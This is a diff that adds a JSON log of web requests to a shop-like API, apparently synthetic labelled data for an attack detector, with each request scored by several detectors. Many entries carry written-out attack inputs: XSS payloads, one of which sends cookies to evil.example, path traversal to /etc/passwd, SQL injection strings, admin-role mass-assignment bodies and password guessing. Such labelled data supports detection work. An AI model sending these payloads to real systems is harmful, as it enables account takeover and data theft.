+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 56603.211,
+    "ip": "10.0.0.12",
+    "m": "GET",
+    "p": "/orders/64",
+    "b": "",
+    "st": 200,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.28
+    ],
+    "r": 0.28
+   },
+   {
+    "t": 56773.591,
+    "ip": "10.0.0.9",
+    "m": "GET",
+    "p": "/orders/90",
+    "b": "",
+    "st": 200,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.43
+    ],
+    "r": 0.43
+   },
+   {
+    "t": 56775.779,
+    "ip": "10.0.0.9",
+    "m": "GET",
+    "p": "/orders/96",
+    "b": "",
+    "st": 404,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.48
+    ],
+    "r": 0.48
+   },
+   {
+    "t": 56791.569,
+    "ip": "10.0.0.9",
+    "m": "GET",
+    "p": "/orders/147",
+    "b": "",
+    "st": 404,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.59
+    ],
+    "r": 0.59
+   },
+   {
+    "t": 56792.225,
+    "ip": "10.0.0.9",
+    "m": "GET",
+    "p": "/orders/150",
+    "b": "",
+    "st": 404,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.6
+    ],
+    "r": 0.6
+   },
+   {
+    "t": 58005.158,
+    "ip": "10.0.0.11",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 58027.481,
+    "ip": "10.0.0.11",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"is_admin\": true}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.96,
+     0.03
+    ],
+    "r": 0.96
+   },
+   {
+    "t": 58049.984,
+    "ip": "10.0.0.11",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"isAdmin\": true, \"role\": \"superuser\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.99,
+     0.03
+    ],
+    "r": 0.99
+   },
+   {
+    "t": 58052.123,
+    "ip": "10.0.0.11",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"isAdmin\": true, \"role\": \"superuser\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.99,
+     0.03
+    ],
+    "r": 0.99
+   },
+   {
+    "t": 58351.56,
+    "ip": "10.0.0.6",
+    "m": "GET",
+    "p": "/orders/14",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.06
+    ],
+    "r": 0.06
+   },
+   {
+    "t": 58359.432,
+    "ip": "10.0.0.6",
+    "m": "GET",
+    "p": "/products/search?q=men%27s%20microphone",
+    "b": "",
+    "st": 500,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.02,
+     0.19
+    ],
+    "r": 0.2
+   },
+   {
+    "t": 58466.282,
+    "ip": "10.0.0.15",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.07
+    ],
+    "r": 0.08
+   },
+   {
+    "t": 58807.082,
+    "ip": "10.0.0.6",
+    "m": "GET",
+    "p": "/products/18",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.14
+    ],
+    "r": 0.14
+   },
+   {
+    "t": 58913.086,
+    "ip": "45.142.99.168",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<svg/onload=alert(document.cookie)>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.8,
+     1,
+     0.99,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 58927.922,
+    "ip": "45.142.99.168",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<scr<script>ipt>alert(1)</scr</script>ipt>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.5,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 59053.739,
+    "ip": "10.0.0.21",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"is_admin\": true}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.96,
+     0.03
+    ],
+    "r": 0.96
+   },
+   {
+    "t": 59181.793,
+    "ip": "10.0.0.23",
+    "m": "GET",
+    "p": "/products/22",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 59229.59,
+    "ip": "10.0.0.25",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"email\": \"user23@example.com\", \"role\": \"admin\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.97,
+     0.03
+    ],
+    "r": 0.97
+   },
+   {
+    "t": 59240.362,
+    "ip": "10.0.0.23",
+    "m": "GET",
+    "p": "/orders",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.14
+    ],
+    "r": 0.14
+   },
+   {
+    "t": 59293.572,
+    "ip": "10.0.0.23",
+    "m": "GET",
+    "p": "/products/32",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 59349.445,
+    "ip": "10.0.0.23",
+    "m": "GET",
+    "p": "/products/search?q=monitor%20white",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 59642.545,
+    "ip": "10.0.0.9",
+    "m": "GET",
+    "p": "/orders",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 59683.355,
+    "ip": "10.0.0.9",
+    "m": "GET",
+    "p": "/products/search?q=usb-c%20charger",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.06
+    ],
+    "r": 0.06
+   },
+   {
+    "t": 59841.269,
+    "ip": "10.0.0.22",
+    "m": "GET",
+    "p": "/orders",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 59971.623,
+    "ip": "10.0.0.13",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"isAdmin\": true, \"role\": \"superuser\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.99,
+     0.03
+    ],
+    "r": 0.99
+   },
+   {
+    "t": 60312.305,
+    "ip": "10.0.0.22",
+    "m": "GET",
+    "p": "/comments",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 60341.564,
+    "ip": "10.0.0.22",
+    "m": "GET",
+    "p": "/products/search?q=headset",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 61339.569,
+    "ip": "203.88.255.220",
+    "m": "GET",
+    "p": "/files?name=....//....//etc/passwd",
+    "b": "",
+    "st": 404,
+    "a": "path_traversal",
+    "s": [
+     1,
+     1,
+     1,
+     0.23
+    ],
+    "r": 1
+   },
+   {
+    "t": 61753.552,
+    "ip": "10.0.0.7",
+    "m": "GET",
+    "p": "/comments",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 61766.899,
+    "ip": "10.0.0.7",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.11
+    ],
+    "r": 0.11
+   },
+   {
+    "t": 61837.413,
+    "ip": "91.134.220.95",
+    "m": "GET",
+    "p": "/files?name=..%5c..%5cetc%5cpasswd",
+    "b": "",
+    "st": 404,
+    "a": "path_traversal",
+    "s": [
+     0.5,
+     1,
+     0.99,
+     0.19
+    ],
+    "r": 1
+   },
+   {
+    "t": 61839.026,
+    "ip": "91.134.220.95",
+    "m": "GET",
+    "p": "/files?name=%2e%2e/%2e%2e/etc/passwd",
+    "b": "",
+    "st": 200,
+    "a": "path_traversal",
+    "s": [
+     1,
+     1,
+     1,
+     0.18
+    ],
+    "r": 1
+   },
+   {
+    "t": 62445.946,
+    "ip": "77.167.133.101",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user2\", \"password\": \"football\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.27
+    ],
+    "r": 0.27
+   },
+   {
+    "t": 62458.997,
+    "ip": "77.167.133.101",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user19\", \"password\": \"123456\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     1,
+     0,
+     0.01,
+     0.42
+    ],
+    "r": 1
+   },
+   {
+    "t": 62463.783,
+    "ip": "77.167.133.101",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user12\", \"password\": \"dragon\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     1,
+     0,
+     0.01,
+     0.49
+    ],
+    "r": 1
+   },
+   {
+    "t": 62775.988,
+    "ip": "203.57.86.94",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<scr<script>ipt>alert(1)</scr</script>ipt>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.5,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 63117.082,
+    "ip": "10.0.0.29",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"email\": \"user27.88@example.com\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.04,
+     0.03
+    ],
+    "r": 0.07
+   },
+   {
+    "t": 63137.213,
+    "ip": "10.0.0.5",
+    "m": "GET",
+    "p": "/orders/85",
+    "b": "",
+    "st": 200,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.52
+    ],
+    "r": 0.52
+   },
+   {
+    "t": 63142.146,
+    "ip": "10.0.0.5",
+    "m": "GET",
+    "p": "/orders/100",
+    "b": "",
+    "st": 404,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.54
+    ],
+    "r": 0.54
+   },
+   {
+    "t": 63158.054,
+    "ip": "10.0.0.5",
+    "m": "GET",
+    "p": "/orders/157",
+    "b": "",
+    "st": 404,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.6
+    ],
+    "r": 0.61
+   },
+   {
+    "t": 63159.555,
+    "ip": "10.0.0.5",
+    "m": "GET",
+    "p": "/orders/163",
+    "b": "",
+    "st": 404,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.61
+    ],
+    "r": 0.61
+   },
+   {
+    "t": 63167.149,
+    "ip": "10.0.0.5",
+    "m": "GET",
+    "p": "/orders/187",
+    "b": "",
+    "st": 404,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.61
+    ],
+    "r": 0.61
+   },
+   {
+    "t": 63431.585,
+    "ip": "10.0.0.21",
+    "m": "GET",
+    "p": "/products/search?q=men%27s%20printer",
+    "b": "",
+    "st": 500,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.08
+    ],
+    "r": 0.09
+   },
+   {
+    "t": 63539.92,
+    "ip": "10.0.0.26",
+    "m": "GET",
+    "p": "/products/32",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 63548.659,
+    "ip": "10.0.0.4",
+    "m": "GET",
+    "p": "/products/search?q=webcam",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 63550.824,
+    "ip": "10.0.0.21",
+    "m": "GET",
+    "p": "/products/50",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.11
+    ],
+    "r": 0.11
+   },
+   {
+    "t": 63587.508,
+    "ip": "10.0.0.21",
+    "m": "GET",
+    "p": "/products/search?q=tablet%20silver",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 63790.697,
+    "ip": "194.141.128.164",
+    "m": "GET",
+    "p": "/files?name=../../../../etc/passwd",
+    "b": "",
+    "st": 200,
+    "a": "path_traversal",
+    "s": [
+     1,
+     1,
+     1,
+     0.37
+    ],
+    "r": 1
+   },
+   {
+    "t": 63869.34,
+    "ip": "10.0.0.24",
+    "m": "GET",
+    "p": "/products/50",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.09
+    ],
+    "r": 0.09
+   },
+   {
+    "t": 64382.973,
+    "ip": "10.0.0.21",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 64566.657,
+    "ip": "10.0.0.8",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"Can someone explain the difference, select the right model o",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 65049.013,
+    "ip": "10.0.0.24",
+    "m": "GET",
+    "p": "/products/search?q=ssd",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 65189.068,
+    "ip": "10.0.0.23",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user21\", \"password\": \"Passw0rd21!\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 65217.539,
+    "ip": "10.0.0.24",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.05
+    ],
+    "r": 0.05
+   },
+   {
+    "t": 65303.764,
+    "ip": "10.0.0.23",
+    "m": "GET",
+    "p": "/products/45",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 65304.073,
+    "ip": "91.46.250.250",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user3\", \"password\": \"admin123\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     0.5,
+     0,
+     0.24,
+     0.3
+    ],
+    "r": 0.74
+   },
+   {
+    "t": 68019.853,
+    "ip": "10.0.0.5",
+    "m": "GET",
+    "p": "/orders",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 68449.255,
+    "ip": "10.0.0.17",
+    "m": "GET",
+    "p": "/products/9",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 68557.307,
+    "ip": "10.0.0.17",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.16
+    ],
+    "r": 0.17
+   },
+   {
+    "t": 68650.869,
+    "ip": "10.0.0.10",
+    "m": "GET",
+    "p": "/orders",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 68670.656,
+    "ip": "10.0.0.10",
+    "m": "GET",
+    "p": "/products/search?q=usb-c%20printer",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 68776.103,
+    "ip": "10.0.0.10",
+    "m": "GET",
+    "p": "/products/58",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 68833.931,
+    "ip": "10.0.0.10",
+    "m": "GET",
+    "p": "/comments",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 70463.096,
+    "ip": "10.0.0.5",
+    "m": "GET",
+    "p": "/products/search?q=speaker",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 72928.065,
+    "ip": "185.21.53.148",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user10\", \"password\": \"iloveyou\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     0.5,
+     0,
+     0.01,
+     0.33
+    ],
+    "r": 0.67
+   },
+   {
+    "t": 72937.327,
+    "ip": "185.21.53.148",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user10\", \"password\": \"princess\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     1,
+     0,
+     0.01,
+     0.42
+    ],
+    "r": 1
+   },
+   {
+    "t": 72942.528,
+    "ip": "185.21.53.148",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user10\", \"password\": \"qwerty\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     1,
+     0,
+     0.01,
+     0.52
+    ],
+    "r": 1
+   },
+   {
+    "t": 73961.838,
+    "ip": "10.0.0.17",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"email\": \"user15.78@example.com\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.03,
+     0.03
+    ],
+    "r": 0.07
+   },
+   {
+    "t": 74085.738,
+    "ip": "10.0.0.17",
+    "m": "GET",
+    "p": "/products/search?q=tablet",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.07
+    ],
+    "r": 0.07
+   },
+   {
+    "t": 74130.609,
+    "ip": "77.154.159.185",
+    "m": "GET",
+    "p": "/products/search?q=%27%20OR%20%27a%27%3D%27a",
+    "b": "",
+    "st": 200,
+    "a": "sqli",
+    "s": [
+     0.5,
+     0.5,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 74305.205,
+    "ip": "10.0.0.23",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 74395.35,
+    "ip": "10.0.0.23",
+    "m": "GET",
+    "p": "/products/search?q=backpack%20silver",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.1
+    ],
+    "r": 0.1
+   },
+   {
+    "t": 74931.518,
+    "ip": "10.0.0.27",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"isAdmin\": true, \"role\": \"superuser\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.99,
+     0.03
+    ],
+    "r": 0.99
+   },
+   {
+    "t": 75037.385,
+    "ip": "185.155.31.54",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<DEtaiLs OpeN onTOgglE=ALeRT(1)>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.8,
+     1,
+     0.99,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 75081.697,
+    "ip": "185.155.31.54",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"\\\"><script>fetch('//evil.example/?c='+document.cookie)</scri",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.5,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 75128.791,
+    "ip": "185.155.31.54",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<svg/onload=alert(document.cookie)>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.8,
+     1,
+     0.99,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 75254.402,
+    "ip": "185.151.91.102",
+    "m": "GET",
+    "p": "/files?name=%2e%2e/%2e%2e/etc/passwd",
+    "b": "",
+    "st": 200,
+    "a": "path_traversal",
+    "s": [
+     1,
+     1,
+     1,
+     0.28
+    ],
+    "r": 1
+   },
+   {
+    "t": 75484.265,
+    "ip": "203.206.18.230",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"') oR ('1'='1\", \"password\": \"test\"}",
+    "st": 500,
+    "a": "sqli",
+    "s": [
+     0.5,
+     0.5,
+     1,
+     0.24
+    ],
+    "r": 1
+   },
+   {
+    "t": 75488.235,
+    "ip": "203.206.18.230",
+    "m": "GET",
+    "p": "/products/search?q=%27%20OR%201%3D1%20--",
+    "b": "",
+    "st": 200,
+    "a": "sqli",
+    "s": [
+     0.8,
+     0.5,
+     1,
+     0.16
+    ],
+    "r": 1
+   },
+   {
+    "t": 75493.948,
+    "ip": "203.206.18.230",
+    "m": "GET",
+    "p": "/products/search?q=microphone%20%26%20accessories",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.27
+    ],
+    "r": 0.28
+   },
+   {
+    "t": 75880.213,
+    "ip": "10.0.0.11",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.05
+    ],
+    "r": 0.05
+   },
+   {
+    "t": 76261.712,
+    "ip": "10.0.0.13",
+    "m": "GET",
+    "p": "/products/55",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 76269.201,
+    "ip": "10.0.0.13",
+    "m": "GET",
+    "p": "/products/search?q=webcam",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 76391.151,
+    "ip": "77.205.168.17",
+    "m": "GET",
+    "p": "/products/search?q=%27%20uNIOn%20sELECt%201%2C%202%2C%203%20--",
+    "b": "",
+    "st": 200,
+    "a": "sqli",
+    "s": [
+     0.8,
+     1,
+     0.99,
+     0.12
+    ],
+    "r": 1
+   },
+   {
+    "t": 76394.701,
+    "ip": "77.205.168.17",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"'/**/OR/**/'1'='1\", \"password\": \"x\"}",
+    "st": 401,
+    "a": "sqli",
+    "s": [
+     0.5,
+     0.5,
+     1,
+     0.22
+    ],
+    "r": 1
+   },
+   {
+    "t": 76658.613,
+    "ip": "10.0.0.4",
+    "m": "GET",
+    "p": "/orders/7",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.3
+    ],
+    "r": 0.3
+   },
+   {
+    "t": 76677.168,
+    "ip": "10.0.0.4",
+    "m": "GET",
+    "p": "/products/search?q=router%20white",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.27
+    ],
+    "r": 0.27
+   },
+   {
+    "t": 76817.717,
+    "ip": "194.232.251.45",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<script>alert(1)</script>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.5,
+     1,
+     0.99,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 76855.434,
+    "ip": "10.0.0.4",
+    "m": "GET",
+    "p": "/files?name=logo.txt",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 77123.664,
+    "ip": "10.0.0.21",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"role\": \"admin\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.99,
+     0.03
+    ],
+    "r": 0.99
+   },
+   {
+    "t": 78600.866,
+    "ip": "10.0.0.20",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.08
+    ],
+    "r": 0.08
+   },
+   {
+    "t": 79099.742,
+    "ip": "203.103.142.13",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<img src=x oNErRor=\\\"&#97;lert(1)\\\">\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.8,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 80052.251,
+    "ip": "185.215.201.184",
+    "m": "GET",
+    "p": "/files?name=..%5c..%5cetc%5cpasswd",
+    "b": "",
+    "st": 404,
+    "a": "path_traversal",
+    "s": [
+     0.5,
+     1,
+     0.99,
+     0.32
+    ],
+    "r": 1
+   },
+   {
+    "t": 80062.517,
+    "ip": "185.215.201.184",
+    "m": "GET",
+    "p": "/files?name=%2e%2e/%2e%2e/etc/passwd",
+    "b": "",
+    "st": 200,
+    "a": "path_traversal",
+    "s": [
+     1,
+     1,
+     1,
+     0.28
+    ],
+    "r": 1
+   },
+   {
+    "t": 80089.151,
+    "ip": "185.215.201.184",
+    "m": "GET",
+    "p": "/files?name=..%2f..%2fetc%2fpasswd",
+    "b": "",
+    "st": 200,
+    "a": "path_traversal",
+    "s": [
+     1,
+     1,
+     1,
+     0.27
+    ],
+    "r": 1
+   },
+   {
+    "t": 80095.647,
+    "ip": "185.215.201.184",
+    "m": "GET",
+    "p": "/files?name=logo.txt",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.27
+    ],
+    "r": 0.28
+   },
+   {
+    "t": 80141.179,
+    "ip": "10.0.0.12",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"Is 5 > 3 stars fair? Maybe 4.\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.02,
+     0.03
+    ],
+    "r": 0.06
+   },
+   {
+    "t": 80236.922,
+    "ip": "10.0.0.7",
+    "m": "GET",
+    "p": "/products/search?q=headset",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 80358.553,
+    "ip": "10.0.0.7",
+    "m": "GET",
+    "p": "/products/28",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 81941.689,
+    "ip": "45.0.177.162",
+    "m": "GET",
+    "p": "/products/search?q=1%27%20AND%20SLEEP%285%29%20--",
+    "b": "",
+    "st": 500,
+    "a": "sqli",
+    "s": [
+     0.8,
+     1,
+     0.99,
+     0.1
+    ],
+    "r": 1
+   },
+   {
+    "t": 82868.484,
+    "ip": "10.0.0.6",
+    "m": "GET",
+    "p": "/products/search?q=monitor",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   }
+  ]
+ },
+ "synced_at": "2026-11-11T22:23:01.495Z"
+}
